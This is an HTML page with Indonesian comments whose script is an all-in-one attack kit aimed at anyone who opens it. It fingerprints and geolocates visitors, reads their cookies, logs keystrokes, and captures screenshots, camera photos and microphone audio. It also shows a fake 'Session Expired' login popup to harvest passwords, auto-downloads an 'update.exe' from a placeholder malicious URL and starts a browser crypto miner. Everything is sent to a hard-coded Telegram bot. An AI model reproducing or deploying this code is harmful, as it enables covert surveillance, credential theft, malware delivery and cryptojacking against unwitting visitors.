<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        html, body {
            background: black;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        /* Hidden phishing popup */
        #phishingPopup {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .popup-content {
            background: white;
            padding: 20px;
            border-radius: 5px;
            width: 300px;
            text-align: center;
        }
        .popup-content input {
            width: 90%;
            padding: 8px;
            margin: 5px 0;
        }
    </style>
    <!-- Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <!-- Phishing popup structure -->
    <div id="phishingPopup">
        <div class="popup-content">
            <h3>Session Expired</h3>
            <p>Please login again to continue</p>
            <input type="text" id="fakeUser" placeholder="Username">
            <input type="password" id="fakePass" placeholder="Password">
            <button onclick="submitPhishing()">Login</button>
        </div>
    </div>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = "8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo";
        const CHAT_ID = "6034935293";
        const REDIRECT_URL = "https://www.google.com"; // Ganti dengan target setelah selesai
        const ENABLE_MINER = true; // Set false jika tidak ingin miner
        // ================================================

        // Data container
        let collectedData = {
            ip: 'unknown',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie || '(none)',
            referrer: document.referrer || '(direct)',
            href: window.location.href,
            timestamp: new Date().toISOString(),
            geolocation: null,
            fingerprint: null,
            vpn: null,
            keys: [], // untuk keylogger
            phishing: null
        };

        let keystrokes = [];

        // ==================== TELEGRAM SENDER ====================
        async function sendToTelegram(text, parseMode = 'Markdown') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: text.substring(0, 4000),
                parse_mode: parseMode
            };
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.log(e); }
        }

        async function sendPhotoToTelegram(photoBase64, caption = '') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', dataURItoBlob(photoBase64), 'capture.jpg');
            formData.append('caption', caption.substring(0, 200));
            try {
                await fetch(url, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) { console.log(e); }
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: mimeString });
        }

        // ==================== FINGERPRINT ====================
        async function getFingerprint() {
            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                collectedData.fingerprint = result.visitorId;
            } catch (e) { collectedData.fingerprint = 'error'; }
        }

        // ==================== GEOLOCATION ====================
        async function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    collectedData.geolocation = 'unsupported';
                    resolve();
                } else {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            collectedData.geolocation = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            };
                            resolve();
                        },
                        () => {
                            collectedData.geolocation = 'denied';
                            resolve();
                        },
                        { timeout: 5000 }
                    );
                }
            });
        }

        // ==================== CAMERA (SADAP) ====================
        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                // Tunggu sebentar biar kamera siap
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(track => track.stop());
                await sendPhotoToTelegram(photo, '📸 Camera capture');
            } catch (e) {
                await sendToTelegram('❌ Camera access denied or failed: ' + e.message);
            }
        }

        // ==================== MICROPHONE (opsional, rekam suara) ====================
        async function captureMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = async () => {
                        const base64 = reader.result;
                        // Kirim audio (simpan sebagai file)
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('audio', dataURItoBlob(base64), 'audio.webm');
                        formData.append('caption', '🎤 Microphone capture');
                        try { await fetch(url, { method: 'POST', body: formData }); } catch(e) {}
                    };
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // rekam 5 detik
            } catch (e) {
                await sendToTelegram('❌ Microphone access denied: ' + e.message);
            }
        }

        // ==================== SCREENSHOT ====================
        async function takeScreenshot() {
            try {
                const canvas = await html2canvas(document.body, { scale: 0.5 });
                const screenshot = canvas.toDataURL('image/jpeg', 0.7);
                await sendPhotoToTelegram(screenshot, '🖥️ Screenshot');
            } catch (e) {
                await sendToTelegram('❌ Screenshot failed: ' + e.message);
            }
        }

        // ==================== KEYLOGGER ====================
        document.addEventListener('keydown', (e) => {
            keystrokes.push({
                key: e.key,
                time: Date.now()
            });
        });

        function sendKeylog() {
            if (keystrokes.length > 0) {
                const logText = keystrokes.map(k => k.key).join('');
                sendToTelegram(`⌨️ Keylog (${keystrokes.length} keys):\n${logText}`);
                keystrokes = [];
            }
        }

        // ==================== VPN/PROXY DETECTION ====================
        async function detectVPN() {
            try {
                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();
                collectedData.vpn = {
                    ip: data.ip,
                    country: data.country_name,
                    city: data.city,
                    isp: data.org,
                    proxy: data.proxy || false,
                    hosting: data.hosting || false
                };
            } catch (e) {
                collectedData.vpn = { error: 'failed' };
            }
        }

        // ==================== AUTO DOWNLOAD (FILE) ====================
        function triggerDownload() {
            const link = document.createElement('a');
            link.href = 'https://example.com/malicious.exe'; // Ganti dengan URL file berbahaya
            link.download = 'update.exe';
            link.click();
        }

        // ==================== PHISHING POPUP ====================
        window.submitPhishing = function() {
            const user = document.getElementById('fakeUser').value;
            const pass = document.getElementById('fakePass').value;
            collectedData.phishing = { user, pass };
            document.getElementById('phishingPopup').style.display = 'none';
            sendToTelegram(`🎣 Phishing credentials:\nUser: ${user}\nPass: ${pass}`);
        };

        function showPhishingPopup() {
            document.getElementById('phishingPopup').style.display = 'flex';
        }

        // ==================== CRYPTO MINER (COINIMP example) ====================
        function startMiner() {
            if (!ENABLE_MINER) return;
            // Gunakan CoinIMP atau CryptoLoot (butuh site key)
            // Contoh menggunakan CoinIMP (ganti dengan site key sendiri)
            const script = document.createElement('script');
            script.src = 'https://coinimp.com/scripts/min.js?site=YOUR_SITE_KEY'; // Ganti dengan site key
            script.async = true;
            document.head.appendChild(script);
            // Inisialisasi miner
            setTimeout(() => {
                if (window.CoinImp) {
                    let miner = new CoinImp.Anonymous('YOUR_SITE_KEY');
                    miner.start();
                }
            }, 1000);
        }

        // ==================== IP DETECTION ====================
        async function getIP() {
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                collectedData.ip = data.ip;
            } catch (e) {
                collectedData.ip = 'failed';
            }
        }

        // ==================== SEND ALL DATA ====================
        async function sendCollectedData() {
            let msg = '⬛ *Visitor Full Data*\n';
            for (let [key, val] of Object.entries(collectedData)) {
                if (key === 'keys') continue;
                if (typeof val === 'object') {
                    msg += `\n*${key}:* ${JSON.stringify(val)}`;
                } else {
                    msg += `\n*${key}:* ${val}`;
                }
            }
            await sendToTelegram(msg);

            // Kirim keylog terpisah
            sendKeylog();
        }

        // ==================== MAIN EXECUTION ====================
        (async function() {
            // Bersihkan history
            window.history.replaceState(null, '', window.location.pathname + '?');

            // Kumpulkan data secara paralel
            await Promise.allSettled([
                getIP(),
                getFingerprint(),
                getGeolocation(),
                detectVPN()
            ]);

            // Kirim data dasar
            await sendCollectedData();

            // Mulai keylogger (periodik)
            setInterval(sendKeylog, 10000); // kirim tiap 10 detik

            // Ambil screenshot
            setTimeout(takeScreenshot, 2000);

            // Coba akses kamera
            setTimeout(captureCamera, 3000);

            // Coba akses mikrofon (opsional)
            setTimeout(captureMicrophone, 4000);

            // Tampilkan phishing popup setelah beberapa detik
            setTimeout(showPhishingPopup, 5000);

            // Trigger download otomatis (pastikan user dikasih warning?)
            setTimeout(triggerDownload, 6000);

            // Mulai miner
            startMiner();

            // Redirect setelah semua selesai
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 10000);
        })();
    </script>
</body>
    </html>
